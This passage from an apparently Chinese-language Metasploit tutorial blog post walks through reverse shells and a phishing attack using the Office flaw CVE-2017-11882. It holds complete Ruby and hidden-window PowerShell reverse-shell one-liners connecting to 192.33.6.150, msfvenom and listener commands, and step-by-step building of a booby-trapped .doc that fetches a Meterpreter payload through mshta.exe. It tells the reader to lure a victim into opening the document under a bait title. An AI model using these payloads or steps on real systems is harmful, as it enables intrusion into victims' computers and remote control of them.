<span class="token comment" spellcheck="true"># cat shell.rb</span>
ruby -rsocket -e <span class="token string">"c=TCPSocket.new(\"192.33.6.150\",\"9999\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># windows cmd powershell后门</span>
msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>windows<span class="token operator">/</span>reverse_powershell LHOST=xxx LPORT=xxx <span class="token operator">-</span>f raw <span class="token operator">-</span>o shell<span class="token punctuation">.</span><span class="token function">ps</span>

<span class="token comment" spellcheck="true"># cat shell.ps</span>
powershell <span class="token operator">-</span>w hidden <span class="token operator">-</span>nop <span class="token operator">-</span>c <span class="token variable">$a</span>=<span class="token string">'192.33.6.150'</span><span class="token punctuation">;</span><span class="token variable">$b</span>=9999<span class="token punctuation">;</span><span class="token variable">$c</span>=<span class="token function">New-Object</span> system<span class="token punctuation">.</span>net<span class="token punctuation">.</span>sockets<span class="token punctuation">.</span>tcpclient<span class="token punctuation">;</span><span class="token variable">$nb</span>=<span class="token function">New-Object</span> System<span class="token punctuation">.</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token variable">$c</span><span class="token punctuation">.</span>ReceiveBufferSize<span class="token punctuation">;</span><span class="token variable">$ob</span>=<span class="token function">New-Object</span> System<span class="token punctuation">.</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span> 65536<span class="token punctuation">;</span><span class="token variable">$eb</span>=<span class="token function">New-Object</span> System<span class="token punctuation">.</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span> 65536<span class="token punctuation">;</span><span class="token variable">$e</span>=<span class="token function">new-object</span> System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>UTF8Encoding<span class="token punctuation">;</span><span class="token variable">$p</span>=<span class="token function">New-Object</span> System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span><span class="token keyword">Process</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName=<span class="token string">'cmd.exe'</span><span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardInput=1<span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput=1<span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError=1<span class="token punctuation">;</span><span class="token variable">$p</span><span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute=0<span class="token punctuation">;</span><span class="token variable">$q</span>=<span class="token variable">$p</span><span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$is</span>=<span class="token variable">$p</span><span class="token punctuation">.</span>StandardInput<span class="token punctuation">;</span><span class="token variable">$os</span>=<span class="token variable">$p</span><span class="token punctuation">.</span>StandardOutput<span class="token punctuation">;</span><span class="token variable">$es</span>=<span class="token variable">$p</span><span class="token punctuation">.</span>StandardError<span class="token punctuation">;</span><span class="token variable">$osread</span>=<span class="token variable">$os</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>BeginRead<span class="token punctuation">(</span><span class="token variable">$ob</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$ob</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$esread</span>=<span class="token variable">$es</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>BeginRead<span class="token punctuation">(</span><span class="token variable">$eb</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$eb</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span>=<span class="token variable">$c</span><span class="token punctuation">.</span>GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">$true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">start-sleep</span> <span class="token operator">-</span>m 100<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$osread</span><span class="token punctuation">.</span>IsCompleted <span class="token operator">-and</span> <span class="token variable">$osread</span><span class="token punctuation">.</span>Result <span class="token operator">-ne</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token variable">$r</span>=<span class="token variable">$os</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>EndRead<span class="token punctuation">(</span><span class="token variable">$osread</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$s</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$ob</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$s</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$osread</span>=<span class="token variable">$os</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>BeginRead<span class="token punctuation">(</span><span class="token variable">$ob</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$ob</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$esread</span><span class="token punctuation">.</span>IsCompleted <span class="token operator">-and</span> <span class="token variable">$esread</span><span class="token punctuation">.</span>Result <span class="token operator">-ne</span> 0<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token variable">$r</span>=<span class="token variable">$es</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>EndRead<span class="token punctuation">(</span><span class="token variable">$esread</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$s</span><span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token variable">$eb</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$s</span><span class="token punctuation">.</span>Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$esread</span>=<span class="token variable">$es</span><span class="token punctuation">.</span>BaseStream<span class="token punctuation">.</span>BeginRead<span class="token punctuation">(</span><span class="token variable">$eb</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$eb</span><span class="token punctuation">.</span>Length<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">.</span>DataAvailable<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token variable">$r</span>=<span class="token variable">$s</span><span class="token punctuation">.</span>Read<span class="token punctuation">(</span><span class="token variable">$nb</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$nb</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$r</span> <span class="token operator">-lt</span> 1<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          <span class="token variable">$str</span>=<span class="token variable">$e</span><span class="token punctuation">.</span>GetString<span class="token punctuation">(</span><span class="token variable">$nb</span><span class="token punctuation">,</span>0<span class="token punctuation">,</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token variable">$is</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span>Connected <span class="token operator">-ne</span> <span class="token boolean">$true</span> <span class="token operator">-or</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">.</span>Client<span class="token punctuation">.</span>Poll<span class="token punctuation">(</span>1<span class="token punctuation">,</span><span class="token namespace">[System.Net.Sockets.SelectMode]</span>::SelectRead<span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token variable">$c</span><span class="token punctuation">.</span>Client<span class="token punctuation">.</span>Available <span class="token operator">-eq</span> 0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">.</span>ExitCode <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="MSF-Listening"><a href="#MSF-Listening" class="headerlink" title="MSF Listening"></a>MSF Listening</h3><pre class="line-numbers language-bash"><code class="language-bash">$ msfconsole
$ msf5 <span class="token operator">></span> use exploit/multi/handler
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show options
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> PAYLOAD <span class="token operator">&lt;</span>Payload value<span class="token operator">></span>
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show options
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOST <span class="token operator">&lt;</span>RHOST value<span class="token operator">></span>
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RPORT <span class="token operator">&lt;</span>RPORT value<span class="token operator">></span>
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LHOST <span class="token operator">&lt;</span>LHOST value<span class="token operator">></span>
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LPORT <span class="token operator">&lt;</span>LPORT value<span class="token operator">></span>
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show options
$ msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Office-CVE-2017-11882"><a href="#Office-CVE-2017-11882" class="headerlink" title="Office-CVE-2017-11882"></a>Office-CVE-2017-11882</h2><p>2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响当时流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。</p>
<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><pre><code>Office 365
Microsoft Office 2000      
Microsoft Office 2003      
Microsoft Office 2007 Service Pack 3
Microsoft Office 2010 Service Pack 2
Microsoft Office 2013 Service Pack 1
Microsoft Office 2016</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
<li>环境</li>
</ul>
<pre><code>OS：Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
Office：Microsoft Office 2010 Service Pack 2</code></pre><ul>
<li>命令执行</li>
</ul>
<p>生成带有命令执行的<code>doc</code>文档：<code>calc.doc</code></p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># python Command_CVE-2017-11882.py -h</span>
usage: Command_CVE-2017-11882.py <span class="token punctuation">[</span>-h<span class="token punctuation">]</span> -c COMMAND -o OUTPUT

PoC <span class="token keyword">for</span> CVE-2017-11882

optional arguments:
  -h, --help            show this <span class="token function">help</span> message and <span class="token keyword">exit</span>
  -c COMMAND, --command COMMAND
                        Command to execute.
  -o OUTPUT, --output OUTPUT
                        Output exploit rtf
 → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># python Command_CVE-2017-11882.py -c "cmd /c calc" -o calc.doc</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Done <span class="token operator">!</span> output <span class="token function">file</span> <span class="token operator">>></span> calc.doc <span class="token operator">&lt;&lt;</span>
 → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># ls</span>
calc.doc  Command_CVE-2017-11882.py  example  PS_shell.rb  README.md
 → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将<code>calc.doc</code>文档以某种方式下载到受害者主机中，并诱使受害者打开该文档</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200704104601867.png" alt="image-20200704104601867"></p>
<p>注意：这里要注意的是生成文档的格式问题，如果你生成的是<code>docx</code>格式文档，那么则会报错显示<code>无法打开文件xxx.docx，因为内容有误</code>。。。</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200704105235549.png" alt="image-20200704105235549"></p>
<ul>
<li>后门反弹</li>
</ul>
<p>既然可以执行任意命令，那么也可以执行命令联动MSF反弹回来一个<code>meterpreter</code>的会话</p>
<p>先将项目中的<code>PS_shell.rb</code>拷贝到MSF项目框架模块中</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># mkdir /usr/share/metasploit-framework/modules/exploits/self</span>
 → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># cp PS_shell.rb /usr/share/metasploit-framework/modules/exploits/self/Office_CVE_2017_11882.rb</span>
 → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>启动MSF，重新加载模块</p>
<pre class="line-numbers language-bash"><code class="language-bash">→ Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfconsole </span>

 _                                                    _
/ \    /\         __                         _   __  /_/ __
<span class="token operator">|</span> <span class="token operator">|</span>\  / <span class="token operator">|</span> _____   \ \           ___   _____ <span class="token operator">|</span> <span class="token operator">|</span> /  \ _   \ \
<span class="token operator">|</span> <span class="token operator">|</span> \/<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> ___\ <span class="token operator">|</span>- -<span class="token operator">|</span>   /\    / __\ <span class="token operator">|</span> -__/ <span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">|</span> <span class="token operator">||</span> <span class="token operator">|</span> <span class="token operator">|</span>- -<span class="token operator">|</span>
<span class="token operator">|</span>_<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _<span class="token operator">|</span>__  <span class="token operator">|</span> <span class="token operator">|</span>_  / -\ __\ \   <span class="token operator">|</span> <span class="token operator">|</span>    <span class="token operator">|</span> <span class="token operator">|</span> \__/<span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span>_
      <span class="token operator">|</span>/  <span class="token operator">|</span>____/  \___\/ /\ \\___/   \/     \__<span class="token operator">|</span>    <span class="token operator">|</span>_\  \___\


       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v5.0.93-dev                          <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> 2029 exploits - 1100 auxiliary - 344 post       <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> 562 payloads - 45 encoders - 10 nops            <span class="token punctuation">]</span>
+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> 7 evasion                                       <span class="token punctuation">]</span>

Metasploit tip: You can use <span class="token function">help</span> to view all available commands

msf5 <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用模块<code>exploits/self/Office_CVE_2017_11882.rb</code>实现MSF联动：</p>
<p>第一步：提供Web服务，供后门程序的下载，并默认启动监听</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/self/Office_CVE_2017_11882 
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/self/Office_CVE_2017_11882<span class="token punctuation">)</span>:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          <span class="token function">yes</span>       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             <span class="token function">yes</span>       The local port to listen on.
   SSL      <span class="token boolean">false</span>            no        Negotiate SSL <span class="token keyword">for</span> incoming connections
   SSLCert                   no        Path to a custom SSL certificate <span class="token punctuation">(</span>default is randomly generated<span class="token punctuation">)</span>
   URIPATH                   no        The URI to use <span class="token keyword">for</span> this exploit <span class="token punctuation">(</span>default is random<span class="token punctuation">)</span>

Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_https<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The local listener <span class="token function">hostname</span>
   LPORT     8443             <span class="token function">yes</span>       The local listener port
   LURI                       no        The HTTP Path

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span>
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> SRVHOST 192.33.6.150
SRVHOST <span class="token operator">=</span><span class="token operator">></span> 192.33.6.150
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> URIPATH love
URIPATH <span class="token operator">=</span><span class="token operator">></span> love
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> 
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/self/Office_CVE_2017_11882<span class="token punctuation">)</span>:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  192.33.6.150     <span class="token function">yes</span>       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             <span class="token function">yes</span>       The local port to listen on.
   SSL      <span class="token boolean">false</span>            no        Negotiate SSL <span class="token keyword">for</span> incoming connections
   SSLCert                   no        Path to a custom SSL certificate <span class="token punctuation">(</span>default is randomly generated<span class="token punctuation">)</span>
   URIPATH  love             no        The URI to use <span class="token keyword">for</span> this exploit <span class="token punctuation">(</span>default is random<span class="token punctuation">)</span>

Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT     8443             <span class="token function">yes</span>       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span>
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">jobs</span> 

Jobs
<span class="token operator">==</span><span class="token operator">==</span>

No active jobs.

msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> 
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit running as background job 3.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.33.6.150:8443 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://192.33.6.150:8080/love
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Server started.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Place the following DDE <span class="token keyword">in</span> an MS document:
mshta.exe <span class="token string">"http://192.33.6.150:8080/love"</span>
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> 
msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">jobs</span> 

Jobs
<span class="token operator">==</span><span class="token operator">==</span>

  Id  Name                                 Payload                          Payload opts
  --  ----                                 -------                          ------------
  5   Exploit: self/Office_CVE_2017_11882  windows/meterpreter/reverse_tcp  tcp://192.33.6.150:8443

msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第二步：制作具有后门联动性的Office文档</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># python Command_CVE-2017-11882.py -c "mshta.exe http://192.33.6.150:8080/love" -o 女孩子都有那些不为人知的密码.doc</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Done <span class="token operator">!</span> output <span class="token function">file</span> <span class="token operator">>></span> 女孩子都有那些不为人知的密码.doc <span class="token operator">&lt;&lt;</span>
 → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># ls</span>
calc.doc  Command_CVE-2017-11882.py  example  PS_shell.rb  README.md  女孩子都有那些不为人知的密码.doc
 → Qftm :/mnt/hgfs/QSec/Pentest/网络钓鱼/Office/CVE-2017-11882<span class="token comment" spellcheck="true"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第三步：MSF监听后门程序，默认在第一步的时候已监听，查看<code>job</code>任务</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token function">jobs</span> 

Jobs
<span class="token operator">==</span><span class="token operator">==</span>

  Id  Name                                 Payload                          Payload opts
  --  ----                                 -------                          ------------
  5   Exploit: self/Office_CVE_2017_11882  windows/meterpreter/reverse_tcp  tcp://192.33.6.150:8443

msf5 exploit<span class="token punctuation">(</span>self/Office_CVE_2017_11882<span class="token punctuation">)</span> <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第四步：将<code>女孩子都有那些不为人知的密码.doc</code>文档以某种方式下载到受害者主机中，并诱使受害者打开该文档，主机上线</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200704112951729.png" alt="image-20200704112951729"></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/" target="_blank" rel="noopener">msfconsole-commands</a></li>
<li><a href="https://blog.xpnsec.com/becoming-system/" target="_blank" rel="noopener">Alternative methods of becoming SYSTEM</a></li>
<li><a href="https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="noopener">Multiple Ways to Bypass UAC using Metasploit</a></li>
<li><a href="https://blog.xpnsec.com/exploring-mimikatz-part-1/" target="_blank" rel="noopener">Exploring Mimikatz - Part 1 - WDigest</a></li>
<li><a href="https://thehacktoday.com/metasploit-commands/" target="_blank" rel="noopener">List of Metasploit Commands - Cheatsheet</a></li>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">msfvenom</a></li>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank" rel="noopener">metasploit-unleashed</a></li>
</ul>
<pre><code>文章首发于安全客：
https://www.anquanke.com/post/id/209966
https://www.anquanke.com/post/id/209972
https://www.anquanke.com/post/id/209974
https://www.anquanke.com/post/id/209975</code></pre>
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://Qftm.github.io/2020/06/20/metasploit-framework/">http://Qftm.github.io/2020/06/20/metasploit-framework/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint polocy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Qftm</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



